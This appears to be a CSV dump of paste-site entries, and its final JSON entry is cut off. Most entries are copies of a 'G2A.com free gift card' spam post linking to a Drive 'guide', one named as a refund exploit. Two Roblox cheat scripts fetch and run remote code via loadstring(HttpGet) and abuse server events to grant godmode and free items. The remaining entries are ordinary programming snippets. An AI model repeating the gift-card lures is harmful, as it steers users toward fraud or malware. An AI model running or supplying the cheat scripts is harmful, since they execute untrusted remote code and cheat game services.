id,title,username,language,date,content
mZ07GGN7,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,romikdikson,JavaScript,Saturday 6th of July 2024 01:04:08 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
WUuBmrHc,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,Justpit,JavaScript,Saturday 6th of July 2024 12:58:05 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any item for free on G2A.com including Steam gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
D00HNwjT,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,DownloadPizza,JavaScript,Saturday 6th of July 2024 12:52:03 AM CDT,"G2A.com free gift card & gaming guide.
Any gift card for free on G2A.com including Xbox gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
MMbgRFcN,üéÅ G2A.COM FREE GIFT CARD GUIDE JUL 2024 V2 üéÅ,jusst2k4,GetText,Saturday 6th of July 2024 12:47:17 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_513222.pdf
 
Working as of:
06 July 2024"
LJXd3Vjv,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,ROBLOX_PLSCHIL1O_O,JavaScript,Saturday 6th of July 2024 12:46:00 AM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Xbox gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
5th of July 2024

"
fg4BLpHb,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,canogajeff,JavaScript,Saturday 6th of July 2024 12:39:56 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Steam gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
wVBDqhby,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,ColtM4A2,JavaScript,Saturday 6th of July 2024 12:33:50 AM CDT,"G2A.com complimentary voucher & games guide.
Any voucher for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
fTGz8TA0,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,Skarface-MKL,JavaScript,Saturday 6th of July 2024 12:27:35 AM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Xbox gift cards & everything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
5th of July 2024

"
ri6egnxe,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,thepplayz,JavaScript,Saturday 6th of July 2024 12:21:27 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
0QCMR5Gv,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,sirmikey,JavaScript,Saturday 6th of July 2024 12:14:44 AM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
BzSSejN5,Untitled,Berly12,Lua,Saturday 6th of July 2024 12:13:58 AM CDT,"--[[
	we êé†re trêèëv5 êèÉêé¢êé≤ êé†nd êé≠rk êèÉêé¢êé≤
]] 

--[[Tabs and Uilib]]--
local Library = loadstring(game:HttpGet(""https://raw.githubusercontent.com/Mapple7777/UI-Librarys/main/UI-1/UI.lua""))()

local main = Library:Create(""Berlyns"",""USSR "")
local PlayerW = main:Tab(""LocalPlayer"")

--[[Config]]--
Config = {
    Player = {
        InfJump = false
    },
}

game:GetService(""UserInputService"").JumpRequest:connect(function()
    if Config.Player.InfJump then
        game:GetService""Players"".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState(""Jumping"")
    end
end)


--// Fly script From Fat IY

 function getRoot(char)
    local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
    return rootPart
    end
    local Players = game:GetService(""Players"")
     local IYMouse = game:GetService(""Players"").LocalPlayer:GetMouse()
     FLYING = false
        QEfly = true
        iyflyspeed = 1
        vehicleflyspeed = 1
        function sFLY(vfly)
        repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChild('Humanoid')
        repeat wait() until IYMouse
        if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
    
        local T = getRoot(Players.LocalPlayer.Character)
        local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
        local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
        local SPEED = 0
    
        local function FLY()
            FLYING = true
            local BG = Instance.new('BodyGyro')
            local BV = Instance.new('BodyVelocity')
            BG.P = 9e3
            BG.Parent = T
            BV.Parent = T
            BG.maxTorque = Vector3.new(9e4, 9e4, 9e4)
            BG.cframe = T.CFrame
            BV.velocity = Vector3.new(0, 0, 0)
            BV.maxForce = Vector3.new(9e4, 9e4, 9e4)
            task.spawn(function()
                repeat wait()
                    if not vfly and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
                        Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
                    end
                    if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
                        SPEED = 50
                    elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
                        SPEED = 0
                    end
                    if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
                        BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
                        lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
                    elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
                        BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
                    else
                        BV.velocity = Vector3.new(0, 0, 0)
                    end
                    BG.cframe = workspace.CurrentCamera.CoordinateFrame
                until not FLYING
                CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
                lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
                SPEED = 0
                BG:Destroy()
                BV:Destroy()
                if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
                    Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
                end
            end)
        end
        flyKeyDown = IYMouse.KeyDown:Connect(function(KEY)
            if KEY:lower() == 'w' then
                CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
            elseif KEY:lower() == 's' then
                CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
            elseif KEY:lower() == 'a' then
                CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
            elseif KEY:lower() == 'd' then 
                CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
            elseif QEfly and KEY:lower() == 'e' then
                CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
            elseif QEfly and KEY:lower() == 'q' then
                CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
            end
            pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
        end)
        flyKeyUp = IYMouse.KeyUp:Connect(function(KEY)
            if KEY:lower() == 'w' then
                CONTROL.F = 0
            elseif KEY:lower() == 's' then
                CONTROL.B = 0
            elseif KEY:lower() == 'a' then
                CONTROL.L = 0
            elseif KEY:lower() == 'd' then
                CONTROL.R = 0
            elseif KEY:lower() == 'e' then
                CONTROL.Q = 0
            elseif KEY:lower() == 'q' then
                CONTROL.E = 0
            end
        end)
        FLY()
     end
    
     function NOFLY()
        FLYING = false
        if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
        if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
            Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
        end
        pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
 end


--[[AutoFarm Tab]]--
AutoW:Toggle('AutoFarm Orbs',function(state)
    Config.AutoFarm.AutoOrbFarm = state
end)
AutoW:Toggle('AutoFarm Xp',function(state)
    Config.AutoFarm.AutoXpFarm = state
end)

AutoW :Toggle(""Auto evolve pet"",function(state)
    _G.Evolve = (state and true or false)
	wait()
	while _G.Evolve == true do
		wait()
		game.Replicatedstorage.rEvents.petEvolveEvent:FireServer(""evolvePet"", ""all"")
		end
		end)

AutoW:Button(""Spawn"",function()
    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-559.2, -7.45058e-08, 417.4))
end)

AutoW:Button(""Snow city"",function()
    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-858.358, 0.5, 2170.35))
end)

AutoW:Button(""Magma city"",function()
    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(1707.25, 0.550008, 4331.05))
end)

AutoW:Button(""Legends highway"",function()
    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(3594.68, 214.804, 7274.56))
end)

AutoW:Toggle('Auto Hoops',function(state)
    Config.AutoFarm.AutoHoopFarm = state
end)

AutoW:Toggle('AutoFarm Gem',function(state)
    Config.AutoFarm.AutoGemFarm = state
end)

AutoW:Toggle('Auto Rebirth',function(state)
    Config.AutoFarm.AutoRebirth = state
end)

--[[LocalPlayer Tab]]--


PlayerW:Slider('Gravity',0,196.2,function(num)
    game.Workspace.Gravity = num
end)

PlayerW:Toggle('Inf Jump ',function(state)
    Config.Player.InfJump = state
end)

PlayerW:Slider('WalkSpeed Config',16,100000000000,function(num)
    game:GetService('Players').LocalPlayer.Character.Humanoid.WalkSpeed = num
end)

PlayerW:Slider('JumpPower Config',50,10000000,function(num)
    game:GetService('Players').LocalPlayer.Character.Humanoid.JumpPower = num
end)

PlayerW:Toggle('Fly',function(state)
    if state then 
        sFLY()
    else
        NOFLY()
    end
end)

PlayerW:Slider('Fly Config',1,15,function(Value)
    iyflyspeed = Value
end)"
ybPkHnsL,Untitled,35657,C++,Saturday 6th of July 2024 12:09:38 AM CDT,"#include <iostream>

using namespace std;


class ForwardList {
public:

    struct Node { //–æ–¥–Ω–æ—Å–≤—è–∑–Ω—ã–π —Å–ø–∏—Å–æ–∫ —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ —É–∑–ª–æ–≤
        int value; // —É–∑–µ–ª —Ö—Ä–∞–Ω–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ç–∏–≤–Ω—É—é —á–∞—Å—Ç—å
        Node* next; // –∏ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å–ª–µ–¥—É—é—â–∏–π —É–∑–µ–ª –≤ —Å–ø–∏—Å–∫–µ
    };

    void push_front(const int& value) {
        head_ = new Node{ value, head_ };
        size_++;
    }

    void pop_front() {
        if (head_ != nullptr) {
            Node* temp = head_;
            head_ = head_->next;
            delete temp;
            size_--;
        }
    }

    void print() {
        Node* temp = head_;
        while (temp != nullptr) {
            cout << temp->value << "" "";
            temp = temp->next;
        }
        cout << endl;
    }

    int size() const {
        return size_;
    }

private:
    int size_ = 0;
    Node* head_ = nullptr;
};

int main() {

    ForwardList list1;

    for (int i = 0; i < 10; i++) {
        list1.push_front(i + 1);
    }
    list1.print();
    cout << list1.size() << endl;

    for (int i = 0; i < 3; i++) {
        list1.pop_front();
    }
    list1.print();
    cout << list1.size() << endl;
}"
ZnsWgsen,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,sayid83,JavaScript,Saturday 6th of July 2024 12:08:28 AM CDT,"G2A.com free gift card & games guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
5th of July 2024

"
qvVckGCi,Fiscal,LightProgrammer000,Java,Friday 5th of July 2024 09:58:42 PM CDT,"package modulo_3;

import java.text.NumberFormat;
import java.util.Locale;

public class EX09
{
    public static void main(String[] args) 
    {
        fiscal();
    }      

    private static void fiscal()
    {
        System.out.println(""*** CALCULOS FISCAIS ***"");
        
        switch (menu())
        {
            case 1:
                System.out.printf(""# Imposto: %s\n"", valorReal(imposto(receberSalario())));
                break;
            
            case 2:
                System.out.printf(""# Novo salario: %s\n"", valorReal(novoSalario(receberSalario())));
                break;
                
            case 3:
                System.out.printf(""# Classificacao: %s\n"", classificacao(receberSalario()));
                break;
                
            case 4:
                System.exit(0);
                break;

            default:
                break;    
        }
    }

    private static int menu()
    {
        int opc = 0;

        do
        {
            System.out.println(""\n#----- Menu -----#"");
            System.out.println(""[1] Imposto"");
            System.out.println(""[2] Novo Salario"");
            System.out.println(""[3] Classificacao"");
            System.out.println(""[4] Finalizar o programa"");
            System.out.print(""# Resp: "");

            try 
            {
                opc = Integer.parseInt(System.console().readLine());
            }

            catch (NumberFormatException e) 
            {
                System.out.println(""# Opcao Invalida !"");            
            }

        } while (opc < 1 || opc > 4);

        return opc;
    }
    
    // Funcao: Receber valor do salario
    private static double receberSalario()
    {
        System.out.print(""# Salario: "");
        double sal = Double.parseDouble(System.console().readLine());
        
        return sal;        
    }

    // Metodo: Calculo do imposto
    private static double imposto(double sal)
    {
        if (sal < 1000)
        {
            return sal * 5/100;                        
        }

        else if (sal >= 1000 && sal <= 3000)
        {
            return sal * 10/100;            
        }

        else
        {
            return sal * 15/100;
        }
    }

    // Metodo: Calculo do novo salario
    private static double novoSalario(double sal) 
    {
        if (sal > 4500)
        {
            return (sal + 45);             
        }

        else if (sal >= 2250 && sal <= 4500)
        {
            return (sal + 150);            
        }

        else if (sal >= 1350 && sal <= 2249.99)
        {
            return (sal + 225);            
        }

        else
        {
            return (sal + 300);                        
        }
    }

    // Metodo: Classificacao
    private static String classificacao(double sal)
    {
        if (sal <= 1500)
        {
            return ""Mal remunerado"";            
        }

        else
        {
            return ""Bem remunerado"";
        }    
    }
    
    // Funcao: Formatar valor
    private static String valorReal(double sal)
    {
        NumberFormat formatoBrasil = NumberFormat.getCurrencyInstance(new Locale(""pt"", ""BR""));

        // Formata o valor como moeda
        return formatoBrasil.format(sal);
    }
}
"
G4Qm9rsc,Creeper Survival Script (OVERPOWERED),2AreYouMental110,Lua,Friday 5th of July 2024 09:35:19 PM CDT,"getgenv().deletewhendupefound = true
local lib = loadstring(game:HttpGet(""https://pastebin.com/raw/A2Wf3WVh""))()
lib.makelib(""Exploiter Survival"")
local main = lib.maketab(""Main"")
local stats = lib.maketab(""Stats"")
local spambool = false

local stuffire = workspace:WaitForChild(""we"")
lib.makebutton(""Godmode (only for survivors)"",main,function()
    game:GetService(""Players"").LocalPlayer.Character.takedamage:FireServer(-math.random(100000,1000000000))
end)
local godmodebool = false
lib.maketoggle(""Auto Godmode (only for survivors)"",main,function(bool)
    godmodebool = bool
    while godmodebool do
        task.wait()
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild(""takedamage"") and game.Players.LocalPlayer.Character:FindFirstChild(""Humanoid"") and game.Players.LocalPlayer.Character.Humanoid.Health <= 200 then
            game:GetService(""Players"").LocalPlayer.Character.takedamage:FireServer(-math.random(100000,1000000000))
        end
    end
end)
local selectedblock = ""obsidian""
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.TargetFilter = workspace.b
lib.makedropdown(""Block to spam"",main,{""wood"",""iron"",""glass"",""cobblestone"",""obsidian"",""glowstone"",""scaffolding""},function(thing)
    selectedblock = thing
end)
lib.maketoggle(""Spam Blocks"",main,function(bool)
    spambool = bool
    while spambool do
        task.wait()
        local build
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild(""Build"") then
            build = game:GetService(""Players"").LocalPlayer.Character.Build
        elseif game.Players.LocalPlayer.Backpack:FindFirstChild(""Build"") then
            build = game:GetService(""Players"").LocalPlayer.Backpack.Build
        end
        if build then
            build.RemoteEvent:FireServer(mouse.Hit.Position,Enum.NormalId.Top,workspace.map.grass,selectedblock)
        end
    end
end)
local ctrldown = false
local s1 = game:GetService(""UserInputService"").InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.LeftControl then
        ctrldown = true
    end
end)
local s2 = game:GetService(""UserInputService"").InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.LeftControl then
        ctrldown = false
    end
end)
lib.ondestroyedfunc = function()
    s1:Disconnect()
    s2:Disconnect()
    godmodebool = false
    spambool = false
end
lib.maketoggle(""Ctrl to Spam Blocks"",main,function(bool)
    spambool = bool
    while spambool do
        task.wait()
        if ctrldown then
            local build
            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild(""Build"") then
                build = game:GetService(""Players"").LocalPlayer.Character.Build
            elseif game.Players.LocalPlayer.Backpack:FindFirstChild(""Build"") then
                build = game:GetService(""Players"").LocalPlayer.Backpack.Build
            end
            if build then
                build.RemoteEvent:FireServer(mouse.Hit.Position,Enum.NormalId.Top,workspace.map.grass,selectedblock)
            end
        end
    end
end)
lib.maketextbox(""Size Weapon"",main,function(thing)
    thing = tonumber(thing)
    local handle = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA(""Tool"").Handle
    handle.Size = Vector3.new(thing/5,thing/5,thing)
    local outline = handle:FindFirstChildWhichIsA(""SelectionBox"") or Instance.new(""SelectionBox"")
    outline.Adornee = handle
    outline.Parent = handle
end)
lib.makedropdown(""Get Blocks"",stats,{""wood"",""iron"",""glass"",""stone"",""obsidian"",""glowstone"",""scaffolding""},function(thing)
    workspace:WaitForChild(""place""):FireServer(thing,6969)
end)
lib.makedropdown(""Get Accesories"",stats,{""None"",""Headband"",""Pan"",""Rocket hat"",""Helmet"",""Angel ring"",""Golden crown""},function(thing)
    stuffire:FireServer(thing,""accessory"",""ac"")
end)
lib.makedropdown(""Get Armor"",stats,{""leather armor"",""iron armor"",""gold armor"",""diamond armor"",""elytra""},function(thing)
    stuffire:FireServer(thing,""armor"",""a"")
end)
lib.makedropdown(""Get Tools"",stats,{""Teleport pearl"",""Bow"",""Torch"",""Shield"",""Apple"",""Golden apple"",""Iron golem"",""Speed potion"",""Jump potion"",""Strength Potion""},function(thing)
    stuffire:FireServer(thing,""tools"",""t"")
end)
lib.makedropdown(""Get Weapons"",stats,{""stone"",""iron"",""gold"",""diamond"",""ruby"",""sapphire"",""Obisidan hammer"",""Obsidian Neonblade""},function(thing)
    stuffire:FireServer(thing.."" sword"",""armor"",""a"")
end)
lib.makedropdown(""Get Creepers"",stats,{""normal"",""ice"",""lava"",""toxic"",""invisable"",""void"",""gold""},function(thing)
    stuffire:FireServer(thing,""creeper"",""c"")
end)
lib.makelabel(""stuff down below is buying it"",stats)
lib.makelabel(""you can still buy the items even at negative points"",stats)
local stuffire2 = workspace.wb
lib.makedropdown(""Get Armor"",stats,{""leather armor"",""iron armor"",""gold armor"",""diamond armor"",""elytra""},function(thing)
    stuffire2:FireServer(thing,0,""armor"",""armorstats"",thing)
end)
lib.makedropdown(""Get Tools"",stats,{""Teleport pearl"",""Bow"",""Torch"",""Shield"",""Apple"",""Golden apple"",""Iron golem"",""Speed potion"",""Jump potion"",""Strength Potion""},function(thing)
    stuffire2:FireServer(thing,0,""tools"",""Toolstats"",thing)
end)
lib.makedropdown(""Get Weapons"",stats,{""stone"",""iron"",""gold"",""diamond"",""ruby"",""sapphire"",""Obsidian hammer"",""Obsidian Neonblade""},function(thing)
    local args = {
        [1] = thing.."" sword"",
        [2] = 450,
        [3] = ""weapons"",
        [4] = ""weaponstats"",
        [5] = thing
    }
    stuffire2:FireServer(unpack(args))
end)
lib.makedropdown(""Get Creepers"",stats,{""normal"",""ice"",""lava"",""toxic"",""invisable"",""void"",""gold""},function(thing)
    stuffire2:FireServer(thing,0,""creepers"",""Creepersstats"",thing)
end)"
bStBN5vh,Sine approximations,Kaelygon,C,Friday 5th of July 2024 08:50:21 PM CDT,"
#include <stdint.h>
#include <stdio.h>

/*
	Sine approximation of 127.5*sin(pi*x/2^7)+127.5
	Based on quadratic (3x-x^3)/2 [0,0.25]
	Detailed functions: https://desmos.com/calculator/sqllbjao14
	Max error = ~1.8%. Identical to sine at 0,64,128,192,255
*/
uint8_t kaelAudio_sine(uint8_t n){
		uint8_t q = n>>6; //quarter phase 0b00=1st 0b01=2nd 0b10=3rd 0b11=4th   
		n = n&0b00111111; //repeat quarters
		n = q&0b01 ? 64-n : n; //mirror 2nd and 4th quarters by x-axis
		uint16_t p = (((uint16_t)n*n)>>6)+1; //calculate 6x-n^3/2^11 cube in two parts to prevent overflow //+1 compensates flooring
		p = 6*n - (((uint16_t)n*p)>>5);
		uint8_t o = (p>>1)+128; //scale and offset to match sine wave
		o = q&0b10 ? ~o : o; //mirror 3rd and 4th quarters by y-axis
		return o;
}

/*
	Sine approximation of sin(2pi*x/128)*128
	Based on parabola 2x-x^2 [0,0.5]
	Detailed functions: https://desmos.com/calculator/fuhb4xzejt
	max error 3.6%. Identical to sine at 0,64,128,192,255
*/
uint8_t kaelAudio_sineParabola(uint8_t phase){
	uint8_t secondHalf = phase & 0b10000000;
	phase <<= 1;
	uint16_t buf = ((uint16_t)(phase) << 1) - UINT8_MAX;
	phase = (uint8_t)((buf * buf) >> 9);
	phase = secondHalf ? phase : ~phase;
	return phase;
}

int main() {
	//printf(""print raw PCM unsigned 8-bit little endian"");
	//printf(""(3x-x^3)/2\n"");
	for(uint16_t i=0;i!=65535;i++){
		uint8_t o = kaelAudio_sine(i);
		fwrite(&o, sizeof(uint8_t), 1, stdout);
	}
	for(uint16_t i=0;i!=65535;i++){
		uint8_t o = kaelAudio_sineParabola(i);
		fwrite(&o, sizeof(uint8_t), 1, stdout);
	}
	//printf(""\n"");
	return 0;
}
"
xR63MySH,URL Stuff,jargon,JavaScript,Friday 5th of July 2024 08:23:22 PM CDT,"// Parse the current query string
const url = new URL(window.location.href);
const params = new URLSearchParams(url.search);

// Modify the query parameters (example: adding/updating a parameter)
params.set('key', 'value'); // Replace 'key' and 'value' with your desired key-value pair

// Write the modified query string back to the URL
url.search = params.toString();
window.history.replaceState({}, '', url);

// Now the URL in the browser's address bar is updated with the new query string
"
RnHuesuc,Advanced Title Changer (Now /w multiple process names & Persistent/ Single Hooking!),alien_fx_fiend,C++,Friday 5th of July 2024 07:25:03 PM CDT,"#include <Windows.h>
#include <string>
#include <TlHelp32.h>
#include <tchar.h>
#include <Psapi.h>
#include <iostream>
#include <vector>
#include <sstream>  // For std::wistringstream

#pragma comment(lib, ""Psapi.lib"")

struct ProcessInfo {
    std::wstring processName;
    HWND hwnd;
};

std::vector<ProcessInfo> targetProcesses;
std::vector<std::wstring> processNames;
bool running = true;

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        std::wcout << L""LookupPrivilegeValue error: "" << GetLastError() << std::endl;
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        std::wcout << L""AdjustTokenPrivileges error: "" << GetLastError() << std::endl;
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::wcout << L""The token does not have the specified privilege. \n"" << std::endl;
        return FALSE;
    }

    return TRUE;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess != NULL) {
        TCHAR szProcessName[MAX_PATH] = TEXT(""<unknown>"");
        if (GetModuleFileNameEx(hProcess, NULL, szProcessName, MAX_PATH)) {
            std::wstring processName(szProcessName);
            size_t pos = processName.find_last_of(L""\\"");
            if (pos != std::wstring::npos) {
                processName = processName.substr(pos + 1);
            }
            CloseHandle(hProcess);

            TCHAR windowTitle[MAX_PATH];
            GetWindowText(hwnd, windowTitle, MAX_PATH);

            for (const auto& targetName : *(std::vector<std::wstring>*)lParam) {
                if (processName == targetName) {
                    targetProcesses.push_back({ processName, hwnd });
                }
            }
        }
        else {
            std::wcout << L""GetModuleFileNameEx error: "" << GetLastError() << std::endl;
        }
    }
    return TRUE;
}

bool ModifyWindowTitles(const std::wstring& newTitle) {
    bool anyModified = false;
    for (const auto& process : targetProcesses) {
        if (SetWindowText(process.hwnd, newTitle.c_str())) {
            anyModified = true;
            std::wcout << L""Modified window title of "" << process.processName << std::endl;
        }
        else {
            std::wcout << L""Failed to modify window title of "" << process.processName << std::endl;
        }
    }
    return anyModified;
}

DWORD WINAPI TitleModifierThread(LPVOID lpParam) {
    std::wstring newTitle = *(std::wstring*)lpParam;
    while (running) {
        ModifyWindowTitles(newTitle);
        Sleep(1000);
    }
    return 0;
}

std::vector<std::wstring> Split(const std::wstring& s, wchar_t delimiter) {
    std::vector<std::wstring> tokens;
    std::wstring token;
    std::wistringstream tokenStream(s); // std::wistringstream for wide strings
    while (std::getline(tokenStream, token, delimiter)) {
        tokens.push_back(token);
    }
    return tokens;
}

int main() {
    std::wstring input;
    std::wcout << L""Enter the process names separated by semicolons (e.g., notepad.exe;calc.exe): "";
    std::getline(std::wcin, input);
    processNames = Split(input, L';');

    std::wstring newTitle;
    std::wcout << L""Enter the new window title text: "";
    std::getline(std::wcin, newTitle);

    std::wstring persistence;
    std::wcout << L""Do you want persistence (Y/N)? "";
    std::getline(std::wcin, persistence);

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::wcout << L""OpenProcessToken error: "" << GetLastError() << std::endl;
        return 1;
    }

    if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
        std::wcout << L""Failed to enable debug privilege."" << std::endl;
        CloseHandle(hToken);
        return 1;
    }

    EnumWindows(EnumWindowsProc, (LPARAM)&processNames);

    if (targetProcesses.empty()) {
        std::wcout << L""No windows found for the specified processes."" << std::endl;
    }
    else {
        if (persistence == L""Y"" || persistence == L""y"") {
            HANDLE hThread = CreateThread(NULL, 0, TitleModifierThread, &newTitle, 0, NULL);
            if (hThread == NULL) {
                std::wcout << L""Failed to create thread."" << std::endl;
                return 1;
            }

            std::wcout << L""Window titles are being modified persistently. Press Enter to stop and exit..."" << std::endl;
            std::cin.get();

            running = false;
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
        else {
            ModifyWindowTitles(newTitle);
            std::wcout << L""Window titles modified once. Press Enter to exit..."" << std::endl;
            std::cin.get();
        }
    }

    SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);
    CloseHandle(hToken);

    return 0;
}"
G7dnEEC1,2024-07-05_stats.json,rdp_snitch,JSON,Friday 5th of July 2024 07:17:55 PM CDT,"{
  ""ip"": {
    ""194.180.49.43"": 2439,
    ""164.92.104.215"": 9,
    ""223.166.31.100"": 6,
    ""185.196.220.41"": 9,
    ""103.126.57.31"": 3,
    ""185.113.106.68"": 9,
    ""167.94.145.104"": 3,
    ""147.185.132.165"": 9,
    ""213.109.202.252"": 21,
    ""167.94.138.57"": 3,
